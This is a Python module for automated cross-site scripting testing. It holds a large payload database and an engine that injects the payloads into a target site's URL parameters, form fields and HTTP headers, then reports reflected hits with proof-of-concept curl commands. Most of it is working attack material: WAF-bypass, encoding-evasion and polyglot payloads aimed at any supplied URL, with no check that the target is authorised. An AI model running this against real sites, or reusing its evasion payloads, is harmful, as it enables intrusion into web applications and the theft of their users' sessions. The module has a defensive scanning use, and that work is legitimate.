"""
Advanced XSS Exploitation Module.
Professional-grade XSS testing with WAF bypass, encoding, and context analysis.
"""
import re
import html
import base64
import logging
from typing import List, Dict, Any, Optional, Tuple
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse, quote
import requests
from dataclasses import dataclass, field
from bs4 import BeautifulSoup
import json

logger = logging.getLogger(__name__)

# Comprehensive XSS payload database organized by context and technique
XSS_PAYLOADS = {
    # Basic HTML context payloads
    'html_basic': [
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '<body/onload=alert(1)>',
        '<iframe src="javascript:alert(1)">',
        '<input/onfocus=alert(1) autofocus>',
        '<marquee/onstart=alert(1)>',
        '<details/open/ontoggle=alert(1)>',
        '<video><source onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
    ],
    
    # Attribute breakout
    'attribute_breakout': [
        '" onmouseover="alert(1)',
        "' onmouseover='alert(1)",
        '" onfocus="alert(1)" autofocus="',
        "' onfocus='alert(1)' autofocus='",
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '" onclick="alert(1)"',
        "' onclick='alert(1)'",
        '" onload="alert(1)"',
    ],
    
    # JavaScript context breakout
    'js_context': [
        "';alert(1)//",
        '";alert(1)//',
        '</script><script>alert(1)</script>',
        "'-alert(1)-'",
        '"-alert(1)-"',
        "\\';alert(1)//",
        '{alert(1)}',
        '${alert(1)}',
        'javascript:alert(1)',
    ],
    
    # URL context payloads
    'url_context': [
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        'javascript:alert(String.fromCharCode(88,83,83))',
        'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    ],
    
    # WAF bypass payloads
    'waf_bypass': [
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<ScRiPt>alert(1)</ScRiPt>',
        '<script/x>alert(1)</script>',
        '<script\\x20>alert(1)</script>',
        '<img/src="x"/onerror=alert(1)>',
        '<svg/onload=&#97;&#108;&#101;&#114;&#116;(1)>',
        '<img src=x onerror=\\u0061\\u006C\\u0065\\u0072\\u0074(1)>',
        '<<script>script>alert(1)</script>',
        '<object data="javascript:alert(1)">',
        '<embed src="javascript:alert(1)">',
        '<math><maction xlink:href="javascript:alert(1)">click</maction></math>',
    ],
    
    # Encoding bypasses
    'encoding_bypass': [
        '<img src=x onerror=&#0000106;&#0000097;&#0000118;&#0000097;&#0000115;&#0000099;&#0000114;&#0000105;&#0000112;&#0000116;&#0000058;&#0000097;&#0000108;&#0000101;&#0000114;&#0000116;&#0000040;&#0000039;&#0000088;&#0000083;&#0000083;&#0000039;&#0000041;>',
        '<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x27;&#x58;&#x53;&#x53;&#x27;&#x29;">click</a>',
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '\\x3Cscript\\x3Ealert(1)\\x3C/script\\x3E',
    ],
    
    # Polyglot payloads (work in multiple contexts)
    'polyglot': [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e",
        "'\"-->]]>*/-->\\n</Title/</Style/</Script/</textArea/</iFrame/</noScript>\\n<img src=x:x onerror=alert(1)>",
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
    ],
    
    # DOM-based XSS probes
    'dom_based': [
        '#<img src=x onerror=alert(1)>',
        '?default=<script>alert(1)</script>',
        '#"><img src=x onerror=alert(1)>',
        'javascript:alert(document.domain)',
    ],
    
    # Event handlers complete list
    'event_handlers': [
        '<img src=x onerror=alert(1)>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<video onloadstart=alert(1) autoplay><source>',
        '<details open ontoggle=alert(1)>',
        '<svg onload=alert(1)>',
        '<object onerror=alert(1) data=x>',
        '<embed onload=alert(1) src=x>',
        '<select onfocus=alert(1) autofocus>',
        '<textarea onfocus=alert(1) autofocus>',
    ],
}

# Additional canary tokens for detection
CANARY_TOKEN = "HADNX_XSS_CANARY_"

@dataclass
class XSSResult:
    url: str
    parameter: str
    payload: str
    context: str
    technique: str
    success: bool
    evidence: str
    method: str = 'GET'
    reflected_in: str = ''  # Where payload was reflected
    waf_bypassed: bool = False
    severity: str = 'HIGH'

@dataclass
class FormData:
    action: str
    method: str
    inputs: List[Dict[str, str]]

class AdvancedXSSExploiter:
    """
    Production-grade XSS exploitation engine.
    Features: Context detection, WAF bypass, encoding tricks, DOM analysis.
    """
    
    def __init__(self, timeout: int = 15, max_payloads_per_context: int = 5):
        self.timeout = timeout
        self.max_payloads = max_payloads_per_context
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        })
        self.tested_count = 0
        self.found_vulns = []
    
    def exploit(self, url: str, deep_scan: bool = True) -> List[XSSResult]:
        """
        Comprehensive XSS testing of target URL.
        """
        results = []
        logger.info(f"Starting advanced XSS scan on {url}")
        
        # 1. Analyze the page structure
        page_analysis = self._analyze_page(url)
        
        # 2. Test URL parameters
        results.extend(self._test_url_parameters(url, page_analysis))
        
        # 3. Test form inputs
        if deep_scan:
            results.extend(self._test_forms(url, page_analysis))
        
        # 4. Test for DOM-based XSS
        results.extend(self._test_dom_xss(url))
        
        # 5. Test reflected XSS in headers
        results.extend(self._test_header_injection(url))
        
        logger.info(f"XSS scan complete: {len(results)} vulnerabilities found from {self.tested_count} tests")
        return results
    
    def _analyze_page(self, url: str) -> Dict[str, Any]:
        """Analyze page structure for smart payload selection."""
        analysis = {
            'has_waf': False,
            'content_type': 'html',
            'forms': [],
            'js_variables': [],
            'potential_sinks': [],
        }
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            html_content = response.text
            
            # WAF detection
            waf_indicators = ['cloudflare', 'akamai', 'incapsula', 'sucuri', 'mod_security', 'aws-waf']
            headers_str = str(response.headers).lower()
            for waf in waf_indicators:
                if waf in headers_str or waf in html_content.lower():
                    analysis['has_waf'] = True
                    logger.info(f"WAF detected: {waf}")
                    break
            
            # Parse forms
            soup = BeautifulSoup(html_content, 'html.parser')
            for form in soup.find_all('form'):
                form_data = {
                    'action': urljoin(url, form.get('action', '')),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': []
                }
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_name = input_tag.get('name', '')
                    if input_name:
                        form_data['inputs'].append({
                            'name': input_name,
                            'type': input_tag.get('type', 'text'),
                            'value': input_tag.get('value', ''),
                        })
                if form_data['inputs']:
                    analysis['forms'].append(form_data)
            
            # Detect potential DOM sinks
            dom_sinks = [
                'document.write', 'innerHTML', 'outerHTML', 'eval(',
                'setTimeout(', 'setInterval(', 'location.href', 'location.hash',
                'document.URL', 'document.referrer', 'window.name',
            ]
            for sink in dom_sinks:
                if sink in html_content:
                    analysis['potential_sinks'].append(sink)
            
        except Exception as e:
            logger.error(f"Page analysis failed: {e}")
        
        return analysis
    
    def _test_url_parameters(self, url: str, analysis: Dict) -> List[XSSResult]:
        """Test XSS in URL parameters with context-aware payloads."""
        results = []
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # If no params, test common injection points
        if not params:
            params = {
                'q': ['test'], 'search': ['test'], 'query': ['test'],
                'id': ['1'], 'page': ['1'], 'name': ['test'],
                'redirect': ['test'], 'url': ['test'], 'callback': ['test'],
            }
        
        for param_name, param_values in params.items():
            logger.info(f"Testing parameter: {param_name}")
            
            # Select payload categories based on analysis
            categories = ['html_basic', 'attribute_breakout', 'js_context']
            if analysis.get('has_waf'):
                categories.extend(['waf_bypass', 'encoding_bypass'])
            categories.append('polyglot')
            
            for category in categories:
                payloads = XSS_PAYLOADS.get(category, [])[:self.max_payloads]
                
                for payload in payloads:
                    result = self._test_single_payload(url, param_name, payload, 'GET', category)
                    if result:
                        results.append(result)
                        logger.warning(f"XSS FOUND: {param_name} via {category}")
                        break  # Found vuln, move to next category
        
        return results
    
    def _test_forms(self, url: str, analysis: Dict) -> List[XSSResult]:
        """Test XSS in form inputs."""
        results = []
        
        for form in analysis.get('forms', []):
            for input_field in form['inputs']:
                input_name = input_field['name']
                logger.info(f"Testing form input: {input_name}")
                
                categories = ['html_basic', 'attribute_breakout']
                if analysis.get('has_waf'):
                    categories.append('waf_bypass')
                
                for category in categories:
                    payloads = XSS_PAYLOADS.get(category, [])[:3]
                    
                    for payload in payloads:
                        # Build form data
                        form_data = {}
                        for inp in form['inputs']:
                            form_data[inp['name']] = inp.get('value', 'test')
                        form_data[input_name] = payload
                        
                        try:
                            if form['method'] == 'POST':
                                response = self.session.post(form['action'], data=form_data, timeout=self.timeout)
                            else:
                                response = self.session.get(form['action'], params=form_data, timeout=self.timeout)
                            
                            self.tested_count += 1
                            
                            if self._is_xss_reflected(response.text, payload):
                                results.append(XSSResult(
                                    url=form['action'],
                                    parameter=input_name,
                                    payload=payload,
                                    context='form_input',
                                    technique=category,
                                    success=True,
                                    evidence=self._extract_evidence(response.text, payload),
                                    method=form['method'],
                                    waf_bypassed=analysis.get('has_waf', False),
                                ))
                                break
                        except Exception as e:
                            logger.debug(f"Form test error: {e}")
        
        return results
    
    def _test_dom_xss(self, url: str) -> List[XSSResult]:
        """Test for DOM-based XSS via fragment identifiers."""
        results = []
        
        for payload in XSS_PAYLOADS['dom_based']:
            # Fragment-based injection
            if payload.startswith('#'):
                test_url = url + payload
            else:
                test_url = url + '#' + payload
            
            # We can't directly detect DOM XSS execution via HTTP
            # But we can probe for potential sinks
            logger.debug(f"DOM XSS probe: {test_url}")
        
        # Return potential DOM XSS indicators from page analysis
        return results
    
    def _test_header_injection(self, url: str) -> List[XSSResult]:
        """Test for XSS via HTTP headers."""
        results = []
        
        headers_to_test = ['Referer', 'User-Agent', 'X-Forwarded-For', 'Accept-Language']
        test_payload = '<script>alert(1)</script>'
        
        for header in headers_to_test:
            try:
                test_headers = self.session.headers.copy()
                test_headers[header] = test_payload
                
                response = self.session.get(url, headers=test_headers, timeout=self.timeout)
                self.tested_count += 1
                
                if self._is_xss_reflected(response.text, test_payload):
                    results.append(XSSResult(
                        url=url,
                        parameter=f"Header: {header}",
                        payload=test_payload,
                        context='http_header',
                        technique='header_injection',
                        success=True,
                        evidence=self._extract_evidence(response.text, test_payload),
                        method='GET',
                        reflected_in=header,
                    ))
                    logger.warning(f"Header XSS found via: {header}")
            except Exception as e:
                logger.debug(f"Header injection test error: {e}")
        
        return results
    
    def _test_single_payload(self, url: str, param: str, payload: str, method: str, category: str) -> Optional[XSSResult]:
        """Test a single XSS payload."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        
        test_url = urlunparse((
            parsed.scheme, parsed.netloc, parsed.path,
            parsed.params, urlencode(params, doseq=True), parsed.fragment
        ))
        
        try:
            response = self.session.get(test_url, timeout=self.timeout, allow_redirects=True)
            self.tested_count += 1
            
            if self._is_xss_reflected(response.text, payload):
                return XSSResult(
                    url=test_url,
                    parameter=param,
                    payload=payload,
                    context='url_param',
                    technique=category,
                    success=True,
                    evidence=self._extract_evidence(response.text, payload),
                    method=method,
                )
        except Exception as e:
            logger.debug(f"Payload test error: {e}")
        
        return None
    
    def _is_xss_reflected(self, html_content: str, payload: str) -> bool:
        """
        Advanced XSS reflection detection.
        Checks for unencoded, partially encoded, and dangerous patterns.
        """
        # Direct match (unencoded)
        if payload in html_content:
            return True
        
        # Check if script tags made it through
        if '<script' in payload.lower() and '<script' in html_content.lower():
            # Verify our payload specifically
            if 'alert(' in html_content.lower():
                return True
        
        # Check event handlers
        event_handlers = ['onerror=', 'onload=', 'onclick=', 'onmouseover=', 'onfocus=']
        for handler in event_handlers:
            if handler in payload.lower() and handler in html_content.lower():
                return True
        
        # Check for javascript: protocol
        if 'javascript:' in payload.lower() and 'javascript:' in html_content.lower():
            return True
        
        return False
    
    def _extract_evidence(self, html_content: str, payload: str, context_size: int = 200) -> str:
        """Extract evidence snippet showing the reflection."""
        idx = html_content.find(payload)
        if idx != -1:
            start = max(0, idx - 50)
            end = min(len(html_content), idx + len(payload) + 150)
            return html_content[start:end]
        return f"Payload present in response but exact match not captured"


def run_xss_exploitation(url: str, deep: bool = True) -> List[Dict[str, Any]]:
    """
    Run comprehensive XSS exploitation.
    Returns findings in standard format.
    """
    exploiter = AdvancedXSSExploiter()
    results = exploiter.exploit(url, deep_scan=deep)
    
    findings = []
    for result in results:
        severity = 'CRITICAL' if result.technique == 'polyglot' or result.waf_bypassed else 'HIGH'
        
        findings.append({
            'issue': f'Cross-Site Scripting (XSS) - {result.technique.replace("_", " ").title()}',
            'severity': severity,
            'category': 'xss',
            'impact': f'XSS in "{result.parameter}". Allows arbitrary JavaScript execution in victim browsers, enabling session hijacking, credential theft, and defacement.',
            'description': f'{result.technique.replace("_", " ").title()} XSS via {result.method}. {"WAF bypassed!" if result.waf_bypassed else ""} Payload successfully reflected without sanitization.',
            'recommendation': 'Implement context-aware output encoding. Use CSP headers. Apply input validation. Consider using auto-escaping template engines.',
            'affected_element': f'{result.method} {result.parameter}',
            'score_impact': 25 if severity == 'CRITICAL' else 20,
            'evidence': result.evidence[:500],
            'poc': f'''# XSS Proof of Concept
# Payload: {result.payload}
curl -X {result.method} "{result.url}"

# Browser test:
# Open: {result.url}
# Observe JavaScript execution''',
            'confidence': 'HIGH'
        })
    
    logger.info(f"Advanced XSS scan: {len(findings)} vulnerabilities found")
    return findings
